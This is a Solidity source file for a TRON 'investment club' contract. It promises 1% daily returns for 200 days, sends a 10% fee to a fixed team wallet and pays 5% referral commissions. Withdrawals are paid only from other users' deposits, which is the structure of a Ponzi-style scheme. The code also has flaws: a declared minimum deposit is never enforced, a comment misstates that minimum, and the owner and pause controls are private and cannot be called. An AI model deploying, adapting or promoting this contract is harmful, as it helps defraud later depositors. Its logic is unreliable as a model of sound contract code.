//SourceUnit: contract_30_11_2020.sol

pragma solidity 0.5.12;

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    // uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return a / b;
  }

  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
  
     function inc(uint a) internal pure returns(uint) {
        return(add(a, 1));
    }

    function dec(uint a) internal pure returns(uint) {
        return(sub(a, 1));
    } 
  
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    
    function owner() private view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() private onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Pausable is Ownable{
    event Paused(address account);
    event Unpaused(address account);

    bool private _paused;

    constructor () internal {
        _paused = false;
    }

    function paused() private view returns (bool) {
        return _paused;
    }

    modifier whenNotPaused() {
        require(!_paused, "Pausable: paused");
        _;
    }

    modifier whenPaused() {
        require(_paused, "Pausable: not paused");
        _;
    }

    function pause() private onlyOwner whenNotPaused {
        _paused = true;
        emit Paused(msg.sender);
    }

    function unpause() private onlyOwner whenPaused {
        _paused = false;
        emit Unpaused(msg.sender);
    }
}


contract InvestmentClubV1 is Pausable
{
    using SafeMath for uint256;
    
    struct Deposit {
        uint256 depositTime;
        uint256 lastDepositTime;
        uint256 amount;
        uint256 validUntil;
    }    
    
    struct DepositHistory {
        uint256 depositTime;
        uint256 lastDepositTime;
        uint256 amount;
        uint256 validUntil;
        bool IsCollect;
    }  
    
    struct WithdrawTable {
        uint256 withdrawTime;
        uint256 amount;
    }  
    
    struct PlayerReferral {
        uint256 createDate;
        address referral;
        uint256 depositAmount;
        uint256 withdrawAmount;
        uint256 commission;
    }         
    
    struct Player {
        Deposit[] deposits;
        DepositHistory[] deposithistory;
        WithdrawTable[] withdrawtable;
        uint256 withdrawns;
        uint256 depositAmount;
        uint256 balance;
        uint256 validUntil;
        uint256 YouCanWithdraw;
        PlayerReferral[] playerReferrals;
        address payable usersReferral;
        bool isFirstDeposit;
        uint256 MytotalCountReferral; 
        uint256 MytotalReferralEarn;  
        uint256 MytotalWithdrawn; 
    }


    uint256[] private PERIOD = [200 days]; //max profit days
    uint256 constant private MIN_DEPOSIT = 5000000; // minimum deposit 50 TRX
    uint256 constant private TEAM_PERCENT = 10;    //10%
    uint256 private totalDeposit;
    address payable private team_wallet = address(0x412F24D0920A7B058093279A628364CEE1A431E775);
    uint256[] private RATE_DIVIDER = [8640000]; //profit per second 86400(1 day in seconds) * 100 (1% per day) =K 8640000
    uint256[] private REF_PERCENT = [5];// referral deposit 5%, withdraw 5%
    uint256 public totalWithdrawn;
    mapping(address => Player) public users;
    event Deposits(address indexed user, uint256 amount); 
    event adminFee(address indexed addr, address indexed wallet,  uint256 amount);
    event RefFee(address indexed addr, address indexed referral,  uint256 amount);
    event Fee(address indexed addr, address indexed referrer, uint256 amount);    
    event Withdrawn(address indexed addr, uint256 amount);
    uint256 public totalUsers;   	
    uint256 public totalCountReferral; 
    uint256 public totalReferralEarn;  
 

    function isExistReferral(address referral) view private returns (bool){
         PlayerReferral[] storage user = users[referral].playerReferrals;
          for (uint i; i< user.length;i++){
              if (user[i].referral==msg.sender)
              return true;
          }
      } 
      
    function isDeposited() public view returns(bool)
    {     Player storage user = users[msg.sender];
          if (user.isFirstDeposit == true) {
            return true;
          }
    }

    function UpdateReferralBalance(address referral,uint256 depositAmount, uint256 withdrawAmount, uint256 commission) private
    {     
        
       if (msg.sender!=referral && referral!=team_wallet)
        {       
            if (!isExistReferral(referral))
            {
                Player storage user = users[referral];
                user.playerReferrals.push(PlayerReferral(now,msg.sender, depositAmount,withdrawAmount,commission));
                totalCountReferral=totalCountReferral.add(1);
                users[referral].MytotalCountReferral=users[referral].MytotalCountReferral.add(1);
                users[referral].MytotalReferralEarn=users[referral].MytotalReferralEarn.add(commission);
            }
            else
            {
            Player storage user = users[referral];
            PlayerReferral[] memory ref = user.playerReferrals;
    
            uint256 i = 0;
            while (i < ref.length){
                PlayerReferral memory getRef = ref[i];
            if (getRef.referral==msg.sender) {
                PlayerReferral storage setRef = users[referral].playerReferrals[i];
                
                setRef.depositAmount = setRef.depositAmount.add(depositAmount);
                setRef.withdrawAmount = getRef.withdrawAmount.add(withdrawAmount);
                setRef.commission = setRef.commission.add(commission);
            }i++;      
            }
             totalReferralEarn=totalReferralEarn.add(commission);
             users[referral].MytotalReferralEarn=users[referral].MytotalReferralEarn.add(commission);
            }
        }
    }

    function deposit(address payable referral) public payable whenNotPaused
    {  
        uint256 amount = msg.value;
        require(amount >= 1, "Your investment amount is less than the minimum amount!");    
        address addr = msg.sender;
        Player storage user = users[msg.sender];
        Player storage getRef = users[referral];
        
        if (users[addr].deposits.length==0)
        {
            totalUsers = totalUsers.add(1);
        }       
        

        //Enable option transfer to the referall partner
        if (users[addr].usersReferral==address(0))
        {
            if (getRef.isFirstDeposit==false)
            {   
                user.usersReferral = team_wallet;
                team_wallet.transfer(amount.mul(TEAM_PERCENT.add(REF_PERCENT[0])).div(100));
            }
            else
            {
                user.usersReferral = referral;
                team_wallet.transfer(amount.mul(TEAM_PERCENT).div(100));
                referral.transfer(amount.mul(REF_PERCENT[0]).div(100));    
                UpdateReferralBalance(referral, amount, 0, amount.mul(REF_PERCENT[0]).div(100)); 
            }
        }
        else
        {       address payable SendRef = user.usersReferral;
                team_wallet.transfer(amount.mul(TEAM_PERCENT).div(100));
                SendRef.transfer(amount.mul(REF_PERCENT[0]).div(100));    
                UpdateReferralBalance(SendRef, amount, 0, amount.mul(REF_PERCENT[0]).div(100));
        }
        
        user.deposits.push(Deposit(now, now, amount, now.add(PERIOD[0])));
        user.deposithistory.push(DepositHistory(now, now, amount, now.add(PERIOD[0]),false));
        user.depositAmount = users[addr].depositAmount.add(amount);
        user.validUntil = now.add(PERIOD[0]);
        totalDeposit = totalDeposit.add(amount);    
        user.isFirstDeposit=true;
        
        emit Deposits(addr, amount); 
    }
    
    function withdraw() public{
        
        address payable addr = msg.sender;
        address payable referral=users[addr].usersReferral;
        uint256 value = collect();
    
        uint256 WithdrawFromAmount = value < address(this).balance ? value: (address(this).balance).sub(address(this).balance.mul(REF_PERCENT[0]).div(100)); //(address(this).balance);//.value.mul(REF_PERCENT[0]).div(100));
       
       users[addr].withdrawtable.push(WithdrawTable(now,WithdrawFromAmount));
       addr.transfer(WithdrawFromAmount);   
       users[addr].YouCanWithdraw = value.sub(WithdrawFromAmount);
       UpdateReferralBalance(referral, 0, value, value.mul(REF_PERCENT[0]).div(100));
       referral.transfer(WithdrawFromAmount.mul(REF_PERCENT[0]).div(100));  
       totalWithdrawn=totalWithdrawn.add(WithdrawFromAmount);
       users[addr].MytotalWithdrawn=users[addr].MytotalWithdrawn.add(WithdrawFromAmount);
       
       emit Withdrawn(addr, WithdrawFromAmount); 
    }    
  
    function collect() private returns(uint256){
            address addr= msg.sender;
            Deposit[] storage invests = users[addr].deposits;
                
                uint256 profit = users[addr].YouCanWithdraw;
                uint256 i = 0;
                uint256 timeSpent=0;
                while (i < invests.length){
                    Deposit storage invest = invests[i];
                    
                    if (invest.lastDepositTime < invest.depositTime.add(PERIOD[0])){
                        uint256 remainedTime = PERIOD[0].sub(invest.lastDepositTime.sub(invest.depositTime));
                        if (remainedTime > 0){
                             timeSpent = now.sub(invest.lastDepositTime);
                         if (remainedTime <= timeSpent){
                                timeSpent = remainedTime;
                                //Update deposit history
                                 DepositHistory[] storage invests_history = users[addr].deposithistory;
                                 invests_history[i].IsCollect=true;   
                            }
                            invest.lastDepositTime = now;
                            profit = profit.add(invest.amount.mul(timeSpent).div(RATE_DIVIDER[0]));
                        }
                    }
                    i++;
                }
                return (profit);
        }
 
    function getUserCollectWithdraw () public view returns(uint256) {
        
            Deposit[] storage invests = users[msg.sender].deposits;
            uint256 profit = users[msg.sender].YouCanWithdraw;    
            uint256 i = 0;
            uint256 timeSpent=0;
            while (i < invests.length){
                Deposit storage invest = invests[i];
                if (invest.lastDepositTime < invest.depositTime.add(PERIOD[0])){
                    uint256 remainedTime = PERIOD[0].sub(invest.lastDepositTime.sub(invest.depositTime));
                    if (remainedTime > 0){
                          timeSpent = now.sub(invest.lastDepositTime);
                     if (remainedTime <= timeSpent){
                            timeSpent = remainedTime;
                        }
                    }
                    profit +=  (invest.amount.mul(timeSpent).div(RATE_DIVIDER[0]));
                }
                i++;
            }
            return profit;
    }  
  
     function getReferrals() public view returns (uint256[] memory, address[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
            Player storage user = users[msg.sender];
            PlayerReferral[] memory ref = user.playerReferrals;
            uint256[] memory createDate = new uint256[](ref.length);
            address[] memory referralAddress = new address[](ref.length);
            uint256[] memory depositAmount = new uint256[](ref.length);
            uint256[] memory withdrawAmount = new uint256[](ref.length);
            uint256[] memory commission = new uint256[](ref.length);

            uint256 i = 0;
            while (i < ref.length){
                PlayerReferral memory getRef = ref[i];
                
            if (getRef.depositAmount > 0 || getRef.withdrawAmount>0) {
                    
                createDate[i] = getRef.createDate;
                referralAddress[i] = getRef.referral;
                depositAmount[i] = getRef.depositAmount;
                withdrawAmount[i] = getRef.withdrawAmount;
                commission[i] = getRef.commission;            
                        
            }i++;  
            }

        return (createDate,referralAddress,depositAmount,withdrawAmount,commission);
     }

     function getPlayerDeposit() public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory,uint256[] memory) {
            Deposit[] memory invests = users[msg.sender].deposits;
            uint256[] memory baseTimes = new uint256[](invests.length);
            uint256[] memory lastCollectedTimes = new uint256[](invests.length);
            uint256[] memory values = new uint256[](invests.length);
            uint256[] memory calcSeconds = new uint256[](invests.length);
            uint256[] memory profit = new uint256[](invests.length);
            uint256[] memory validUntil = new uint256[](invests.length);
    
            uint256 i = 0;
            uint256 timeSpent = 0;
            while (i < invests.length){
                Deposit memory invest = invests[i];
                
            if (invest.lastDepositTime < invest.depositTime.add(PERIOD[0])){
                        uint256 remainedTime = PERIOD[0].sub(invest.lastDepositTime.sub(invest.depositTime));
                        if (remainedTime > 0){    
                        timeSpent=now.sub(invest.lastDepositTime);
                        if (remainedTime <= timeSpent){
                            timeSpent = remainedTime;
                            }
                        }
                baseTimes[i] = invest.depositTime;
                lastCollectedTimes[i] = invest.lastDepositTime;
                values[i] = invest.amount;
                calcSeconds[i] = timeSpent;
                profit[i] = (invest.amount * timeSpent).div(RATE_DIVIDER[0]);
                validUntil[i] = invest.depositTime.add(PERIOD[0]);
            }i++;  
            }

        return (baseTimes, lastCollectedTimes, values, calcSeconds,profit,validUntil);
}

    function getPlayerDepositHistory() public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
            DepositHistory[] memory invests = users[msg.sender].deposithistory;
            uint256[] memory baseTimes = new uint256[](invests.length);
            uint256[] memory values = new uint256[](invests.length);
            uint256[] memory profit = new uint256[](invests.length);
            uint256[] memory validUntil = new uint256[](invests.length);
            bool[] memory IsCollect = new bool[](invests.length);    
    
            uint256 i = 0;
            uint256 timeSpent = 0;
            while (i < invests.length){
                DepositHistory memory invest = invests[i];
    
            if (invest.lastDepositTime < invest.depositTime.add(PERIOD[0])){
                        uint256 remainedTime = PERIOD[0].sub(invest.lastDepositTime.sub(invest.depositTime));
                        if (remainedTime > 0){    
                        timeSpent=now.sub(invest.lastDepositTime);
                        if (remainedTime <= timeSpent){
                            timeSpent = remainedTime;
                            }
                        }
                baseTimes[i] = invest.depositTime;
                values[i] = invest.amount;
                profit[i] = (invest.amount * timeSpent).div(RATE_DIVIDER[0]);
                validUntil[i] = invest.depositTime.add(PERIOD[0]);
                IsCollect[i] = invest.IsCollect;
            }i++;  
            }
            return (baseTimes, values, profit,validUntil,IsCollect);
    }
    function getPlayerWithdrawHistory() public view returns (uint256[] memory, uint256[] memory,uint256[] memory) {
            WithdrawTable[] memory invests = users[msg.sender].withdrawtable;
            uint256[] memory withdrawTime = new uint256[](invests.length);
            uint256[] memory values = new uint256[](invests.length);
            uint256[] memory lastime = new uint256[](invests.length);
            
            uint256 i = 0;
            while (i < invests.length){
                WithdrawTable memory invest = invests[i];
                
                if (invest.amount>0)
                {
                 withdrawTime[i] = invest.withdrawTime;
                 values[i] = invest.amount;
            }i++;
            }
            return (withdrawTime,values,lastime);
    }
    function getContractBalance() public view returns(uint256)
    {
        return address(this).balance;
    }
    function getTotalStats() public view returns (uint256[] memory) {
        uint256[] memory combined = new uint256[](10);
        combined[0] = totalDeposit;
        combined[1] = address(this).balance;
        combined[2] = totalUsers;    
        combined[3] = totalCountReferral;
        combined[4] = totalReferralEarn;
        combined[5] = users[msg.sender].MytotalCountReferral;
        combined[6] = users[msg.sender].MytotalReferralEarn; 
        combined[7] = totalWithdrawn;
        combined[8] = users[msg.sender].depositAmount; 
        combined[9] = users[msg.sender].MytotalWithdrawn; 
        
        return combined;
    }    
}